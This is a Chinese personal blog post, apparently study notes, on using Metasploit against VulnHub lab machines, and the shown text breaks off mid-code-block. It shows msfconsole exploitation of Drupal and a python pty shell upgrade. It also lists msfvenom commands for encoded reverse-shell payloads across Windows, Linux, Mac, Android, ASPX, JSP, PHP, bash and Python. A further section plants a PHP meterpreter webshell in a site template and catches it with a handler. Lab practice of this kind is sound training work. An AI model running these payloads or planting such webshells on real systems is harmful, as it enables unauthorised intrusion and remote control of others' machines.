<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.2">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"ttoc.xin","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"appID":"1NWCFV229B","apiKey":"89f81f113af1e49e4b5061eb680ea44d","indexName":"hexo","hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="记性不好记录一下">
<meta property="og:type" content="article">
<meta property="og:title" content="常用工具的使用">
<meta property="og:url" content="https://ttoc.xin/tooluse(Commontools)/index.html">
<meta property="og:site_name" content="Ttoc&#39;s blog">
<meta property="og:description" content="记性不好记录一下">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://ttoc.xin/tooluse(Commontools)/image-20220830094506049.png">
<meta property="og:image" content="https://ttoc.xin/tooluse(Commontools)/image-20220830094939297.png">
<meta property="og:image" content="https://ttoc.xin/tooluse(Commontools)/image-20220830095106784.png">
<meta property="og:image" content="https://ttoc.xin/tooluse(Commontools)/image-20220830105519336.png">
<meta property="og:image" content="https://ttoc.xin/tooluse(Commontools)/image-20220830110143969.png">
<meta property="og:image" content="https://ttoc.xin/tooluse(Commontools)/image-20220830110303594.png">
<meta property="og:image" content="https://ttoc.xin/tooluse(Commontools)/image-20220830110551273.png">
<meta property="og:image" content="https://ttoc.xin/tooluse(Commontools)/image-20220830110648417.png">
<meta property="og:image" content="https://ttoc.xin/tooluse(Commontools)/image-20220830110825217.png">
<meta property="og:image" content="https://ttoc.xin/tooluse(Commontools)/image-20220830110907408.png">
<meta property="og:image" content="https://ttoc.xin/tooluse(Commontools)/image-20220903222910397.png">
<meta property="og:image" content="https://ttoc.xin/tooluse(Commontools)/image-20220903144052531.png">
<meta property="og:image" content="https://ttoc.xin/tooluse(Commontools)/image-20220903223007361.png">
<meta property="og:image" content="https://ttoc.xin/tooluse(Commontools)/image-20220903221140645.png">
<meta property="og:image" content="https://ttoc.xin/tooluse(Commontools)/image-20220903223039265.png">
<meta property="og:image" content="https://ttoc.xin/tooluse(Commontools)/image-20220903221238918.png">
<meta property="og:image" content="https://ttoc.xin/tooluse(Commontools)/image-20220903221336853.png">
<meta property="og:image" content="https://ttoc.xin/tooluse(Commontools)/image-20220903220102252.png">
<meta property="og:image" content="https://ttoc.xin/tooluse(Commontools)/image-20220903220250819.png">
<meta property="og:image" content="https://ttoc.xin/tooluse(Commontools)/image-20220903223414089.png">
<meta property="og:image" content="https://ttoc.xin/tooluse(Commontools)/image-20220830211739164.png">
<meta property="og:image" content="https://ttoc.xin/tooluse(Commontools)/image-20220830211817515.png">
<meta property="og:image" content="https://ttoc.xin/tooluse(Commontools)/image-20220831221031390.png">
<meta property="og:image" content="https://ttoc.xin/tooluse(Commontools)/image-20220831221151099.png">
<meta property="og:image" content="https://ttoc.xin/tooluse(Commontools)/image-20220831223359965.png">
<meta property="og:image" content="https://ttoc.xin/tooluse(Commontools)/image-20220831223432802.png">
<meta property="og:image" content="https://ttoc.xin/tooluse(Commontools)/image-20220831223714569.png">
<meta property="og:image" content="https://ttoc.xin/tooluse(Commontools)/image-20220831223950721.png">
<meta property="og:image" content="https://ttoc.xin/tooluse(Commontools)/image-20220831224205560.png">
<meta property="og:image" content="https://ttoc.xin/tooluse(Commontools)/image-20220903140126704.png">
<meta property="og:image" content="https://ttoc.xin/tooluse(Commontools)/image-20220904133118746.png">
<meta property="og:image" content="https://ttoc.xin/tooluse(Commontools)/image-20221103104233193.png">
<meta property="og:image" content="https://ttoc.xin/tooluse(Commontools)/image-20221120141340099.png">
<meta property="article:published_time" content="2023-02-13T13:31:12.814Z">
<meta property="article:modified_time" content="2025-01-19T15:50:13.326Z">
<meta property="article:author" content="Ttoc">
<meta property="article:tag" content="tools">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ttoc.xin/tooluse(Commontools)/image-20220830094506049.png">

<link rel="canonical" href="https://ttoc.xin/tooluse(Commontools)/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>常用工具的使用 | Ttoc's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style><link rel="stylesheet" href="/css/prism-xonokai.css" type="text/css"></head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Ttoc's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">必须从过去的错误学习教训，而非依赖过去的成功。</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://ttoc.xin/tooluse(Commontools)/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Ttoc">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Ttoc's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          常用工具的使用
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-02-13 21:31:12" itemprop="dateCreated datePublished" datetime="2023-02-13T21:31:12+08:00">2023-02-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-01-19 23:50:13" itemprop="dateModified" datetime="2025-01-19T23:50:13+08:00">2025-01-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/daily/" itemprop="url" rel="index"><span itemprop="name">daily</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p><code>记性不好记录一下</code></p>
<span id="more"></span>

<h1 id="常用工具的使用"><a href="#常用工具的使用" class="headerlink" title="常用工具的使用"></a>常用工具的使用</h1><h2 id="1）msf"><a href="#1）msf" class="headerlink" title="1）msf"></a>1）msf</h2><h3 id="（1）msf基本使用"><a href="#（1）msf基本使用" class="headerlink" title="（1）msf基本使用"></a>（1）msf基本使用</h3><p><code>一个漏洞利用框架,对计算机软件漏洞进行攻击</code></p>
<p><strong>这里以vulnhub dc1为例</strong></p>
<p>终端输入<code>msfconsole</code>，进入msf界面，或者菜单也可以打开</p>
<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220830094506049.png"><img src="/tooluse(Commontools)/image-20220830094506049.png" alt="image-20220830094506049"></a></p>
<figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入<span class="built_in">search</span> drupal，找一下有没有drupal可以利用的脚本</span><br><span class="line"><span class="comment">/*对于其他命令，可以用help查询*/</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220830094939297.png"><img src="/tooluse(Commontools)/image-20220830094939297.png" alt="image-20220830094939297"></a></p>
<p>这里可以选择不同的脚本，下面以编号1的脚本为例，其他的应该也可以</p>
<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入<span class="keyword">use</span> <span class="number">1</span>，进入编号<span class="number">1</span>脚本的运行环境</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220830095106784.png"><img src="/tooluse(Commontools)/image-20220830095106784.png" alt="image-20220830095106784"></a></p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入<span class="keyword">show</span> <span class="keyword">options</span>,查看脚本运行的所需要配置的项目</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220830105519336.png"><img src="/tooluse(Commontools)/image-20220830105519336.png" alt="image-20220830105519336"></a></p>
<p><code>Required</code>是要求填的，yes是必填项，no是非必填项</p>
<p>这里的<code>RHOSTS</code>没有填，这里是要求填入<code>target hosts</code>也就是目标地址，也就是我们靶机的地址</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入<span class="keyword">set</span> RHOSTS <span class="comment">192.168.133.136</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220830110143969.png"><img src="/tooluse(Commontools)/image-20220830110143969.png" alt="image-20220830110143969"></a></p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">再输入<span class="built_in">run</span>，运行脚本</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220830110303594.png"><img src="/tooluse(Commontools)/image-20220830110303594.png" alt="image-20220830110303594"></a></p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入<span class="built_in">shell</span>，进入<span class="built_in">shell</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220830110551273.png"><img src="/tooluse(Commontools)/image-20220830110551273.png" alt="image-20220830110551273"></a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入<span class="built_in">whoami</span>，查看当前的权限</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220830110648417.png"><img src="/tooluse(Commontools)/image-20220830110648417.png" alt="image-20220830110648417"></a></p>
<p>发现是个低权限的账号</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入<span class="built_in">ls</span>，可以查看到当前的目录文件</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220830110825217.png"><img src="/tooluse(Commontools)/image-20220830110825217.png" alt="image-20220830110825217"></a></p>
<p>但是一堆东西挤在一起，还是有些不太方便</p>
<p><strong>输入下方指令，利用python进入交互式shell【固定姿势，要记住】</strong></p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220830110907408.png"><img src="/tooluse(Commontools)/image-20220830110907408.png" alt="image-20220830110907408"></a></p>
<h3 id="（2）msf后门生成模块"><a href="#（2）msf后门生成模块" class="headerlink" title="（2）msf后门生成模块"></a>（2）msf后门生成模块</h3><h4 id="普通生成"><a href="#普通生成" class="headerlink" title="普通生成"></a>普通生成</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -<span class="selector-tag">p</span> 有效载荷 -f 输出格式 -o 输出文件</span><br><span class="line"></span><br><span class="line">msfvenom -<span class="selector-tag">p</span> windows/meterpreter/reverse_tcp -f exe -o payload<span class="selector-class">.exe</span></span><br></pre></td></tr></table></figure>

<h4 id="编码生成"><a href="#编码生成" class="headerlink" title="编码生成"></a>编码生成</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a 系统架构 --platform 系统平台 -p 有效载荷 <span class="attribute">lhost</span>=攻击机IP <span class="attribute">lport</span>=攻击机端口 -e 编码方式 -i编码次数 -f 输出格式 -o 输出文件</span><br><span class="line"></span><br><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp <span class="attribute">lhost</span>=192.168.1.1 <span class="attribute">lport</span>=8888 -i 3 -e x86/shikata_ga_nai -f exe -o payload.exe</span><br></pre></td></tr></table></figure>

<h4 id="以DC-3举个例子"><a href="#以DC-3举个例子" class="headerlink" title="*以DC-3举个例子"></a>*以DC-3举个例子</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入msfvenom -<span class="selector-tag">p</span> php/meterpreter/reverse_tcp LHOST=kali的ip LPORT=<span class="number">4444</span> -f raw &gt; shell<span class="selector-class">.php</span></span><br><span class="line"><span class="comment">//注意，LHOST是kali的ip</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220903222910397.png"><img src="/tooluse(Commontools)/image-20220903222910397.png" alt="image-20220903222910397"></a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入<span class="built_in">ls</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220903144052531.png"><img src="/tooluse(Commontools)/image-20220903144052531.png" alt="image-20220903144052531"></a></p>
<p>发现目录下生成了 <code>shell.php</code></p>
<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220903223007361.png"><img src="/tooluse(Commontools)/image-20220903223007361.png" alt="image-20220903223007361"></a></p>
<p>然后在网站新建一个php文件</p>
<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220903221140645.png"><img src="/tooluse(Commontools)/image-20220903221140645.png" alt="image-20220903221140645"></a></p>
<p>然后把木马内容导入进去</p>
<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220903223039265.png"><img src="/tooluse(Commontools)/image-20220903223039265.png" alt="image-20220903223039265"></a></p>
<p>然后保存一下</p>
<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220903221238918.png"><img src="/tooluse(Commontools)/image-20220903221238918.png" alt="image-20220903221238918"></a></p>
<p>然后试试能不能访问木马</p>
<p>然后我们就需要找到木马文件路径，进行访问看看，能不能访问成功</p>
<p>因为我们文件是在<code>/templates/protostar/less/</code>下上传的，所以访问</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.139</span><span class="regexp">/templates/</span>protostar<span class="regexp">/less/</span><span class="number">1</span>.php</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220903221336853.png"><img src="/tooluse(Commontools)/image-20220903221336853.png" alt="image-20220903221336853"></a></p>
<p>看到&#x2F;*，看来是可以成功访问</p>
<h5 id="msf利用木马"><a href="#msf利用木马" class="headerlink" title="msf利用木马"></a>msf利用木马</h5><p>然后用msf进行利用</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">先输入msfconsole，进入msf</span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">然后输入</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line">进入我们利用msf制作的木马利用环境</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220903220102252.png"><img src="/tooluse(Commontools)/image-20220903220102252.png" alt="image-20220903220102252"></a></p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入<span class="keyword">show</span> <span class="keyword">options</span></span><br><span class="line">看看需要填写什么</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220903220250819.png"><img src="/tooluse(Commontools)/image-20220903220250819.png" alt="image-20220903220250819"></a></p>
<p>看到LHOST监听的ip没有填写</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入<span class="keyword">set</span> LHOST <span class="comment">192.168.133.140</span> //<span class="comment">kali</span>的<span class="comment">ip</span></span><br></pre></td></tr></table></figure>



<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入<span class="built_in">run</span>，运行，会卡住</span><br></pre></td></tr></table></figure>

<p>这里就是在等待我们的木马运行，我们只需要刷新一下我们之前访问木马的网页</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.133.139</span>/templates/protostar/<span class="number">1</span>.php</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220903223414089.png"><img src="/tooluse(Commontools)/image-20220903223414089.png" alt="image-20220903223414089"></a></p>
<p>后面操作不赘述</p>
<h4 id="msfvenom-—list-archs"><a href="#msfvenom-—list-archs" class="headerlink" title="msfvenom —list archs"></a>msfvenom —list archs</h4><p>#查看支持的系统架构</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aarch<span class="number">64</span><span class="punctuation">,</span> armbe<span class="punctuation">,</span> armle<span class="punctuation">,</span> cbea<span class="punctuation">,</span> cbea<span class="number">64</span><span class="punctuation">,</span> cmd<span class="punctuation">,</span> dalvik<span class="punctuation">,</span> firefox<span class="punctuation">,</span> java<span class="punctuation">,</span> mips<span class="punctuation">,</span> mips<span class="number">64</span><span class="punctuation">,</span> mips<span class="number">64</span>le<span class="punctuation">,</span> mipsbe<span class="punctuation">,</span> mipsle<span class="punctuation">,</span> nodejs<span class="punctuation">,</span> php<span class="punctuation">,</span> ppc<span class="punctuation">,</span> ppc<span class="number">64</span><span class="punctuation">,</span> ppc<span class="number">64</span>le<span class="punctuation">,</span> ppce<span class="number">500</span>v<span class="number">2</span><span class="punctuation">,</span> python<span class="punctuation">,</span> r<span class="punctuation">,</span> ruby<span class="punctuation">,</span> sparc<span class="punctuation">,</span> sparc<span class="number">64</span><span class="punctuation">,</span> tty<span class="punctuation">,</span> <span class="keyword">x</span><span class="number">64</span><span class="punctuation">,</span> <span class="keyword">x</span><span class="number">86</span><span class="punctuation">,</span> <span class="keyword">x</span><span class="number">86</span>_<span class="number">64</span><span class="punctuation">,</span> zarch</span><br></pre></td></tr></table></figure>

<h4 id="msfvenom-—list-platforms"><a href="#msfvenom-—list-platforms" class="headerlink" title="msfvenom —list platforms"></a>msfvenom —list platforms</h4><p>#查看支持系统平台</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aix, <span class="keyword">android, </span>apple_ios, <span class="keyword">bsd, </span><span class="keyword">bsdi, </span>cisco, firefox, freebsd, hardware, hpux, irix, <span class="keyword">java, </span><span class="keyword">javascript, </span><span class="keyword">juniper, </span>linux, mainframe, <span class="keyword">multi, </span>netbsd, netware, nodejs, openbsd, osx, php, python, r, ruby, solaris, unifi, unix, unknown, windows</span><br></pre></td></tr></table></figure>



<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l payload <span class="comment">#列出所有可用的payload</span></span><br><span class="line"></span><br><span class="line">msfvenom -l formats <span class="comment">#列出所有的输出格式</span></span><br><span class="line"></span><br><span class="line">msfvenom -l <span class="built_in">encrypt</span> <span class="comment">#列出所有的加密方式</span></span><br><span class="line"></span><br><span class="line">msfvenom -l encoders <span class="comment">#列出所有的编码器</span></span><br></pre></td></tr></table></figure>

<h4 id="常见生成格式"><a href="#常见生成格式" class="headerlink" title="常见生成格式"></a>常见生成格式</h4><h5 id="1、-Windows"><a href="#1、-Windows" class="headerlink" title="1、 Windows"></a>1、 Windows</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="attr">--platform</span> windows -<span class="selector-tag">a</span> x86 -<span class="selector-tag">p</span> windows/meterpreter/reverse_tcp -<span class="selector-tag">i</span> <span class="number">3</span> -e x86/shikata_ga_nai -f exe -o payload<span class="selector-class">.exe</span></span><br></pre></td></tr></table></figure>

<h5 id="2、Linux"><a href="#2、Linux" class="headerlink" title="2、Linux"></a>2、Linux</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="attr">--platform</span> linux -<span class="selector-tag">a</span> x86 -<span class="selector-tag">p</span> linux/x86/meterpreter/reverse_tcp -f elf -o payload<span class="selector-class">.elfxxxxxxxxxx</span> msfvenom <span class="attr">--platform</span> linux -<span class="selector-tag">a</span> x86 -<span class="selector-tag">p</span> linux/x86/meterpreter/reverse_tcp -f elf -o payload.elf1</span><br></pre></td></tr></table></figure>

<h5 id="3、Mac"><a href="#3、Mac" class="headerlink" title="3、Mac"></a>3、Mac</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="attr">--platform</span> osx -<span class="selector-tag">a</span> x86 -<span class="selector-tag">p</span> osx/x86/shell_reverse_tcp -f macho -o payload<span class="selector-class">.macho</span></span><br></pre></td></tr></table></figure>

<h5 id="4、Android"><a href="#4、Android" class="headerlink" title="4、Android"></a>4、Android</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android<span class="regexp">/meterpreter/</span>reverse_tcp -o payload.apk</span><br></pre></td></tr></table></figure>

<h5 id="5、Aspx"><a href="#5、Aspx" class="headerlink" title="5、Aspx"></a>5、Aspx</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="attr">--platform</span> windows-<span class="selector-tag">p</span> windows/meterpreter/reverse_tcp -f aspx -o payload<span class="selector-class">.aspx</span></span><br></pre></td></tr></table></figure>

<h5 id="6、JSP"><a href="#6、JSP" class="headerlink" title="6、JSP"></a>6、JSP</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="attr">--platform</span> java -<span class="selector-tag">p</span> java/jsp_shell_reverse_tcp -f raw -o payload<span class="selector-class">.jsp</span></span><br></pre></td></tr></table></figure>

<h5 id="7、PHP"><a href="#7、PHP" class="headerlink" title="7、PHP"></a>7、PHP</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp -f raw -o payload.php</span><br></pre></td></tr></table></figure>

<h5 id="8、BASH"><a href="#8、BASH" class="headerlink" title="8、BASH"></a>8、BASH</h5><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p <span class="keyword">cmd</span><span class="language-bash">/unix/reverse_bash -f raw -o shell.sh</span></span><br></pre></td></tr></table></figure>

<h5 id="9、Python"><a href="#9、Python" class="headerlink" title="9、Python"></a>9、Python</h5><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -<span class="keyword">p</span> <span class="keyword">python</span>/meterpreter/reverse_tcp -<span class="keyword">f</span> raw -<span class="keyword">o</span> <span class="keyword">shell</span>.<span class="keyword">py</span></span><br></pre></td></tr></table></figure>



<h4 id="Msfvenom常用命令参数"><a href="#Msfvenom常用命令参数" class="headerlink" title="Msfvenom常用命令参数"></a>Msfvenom常用命令参数</h4><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 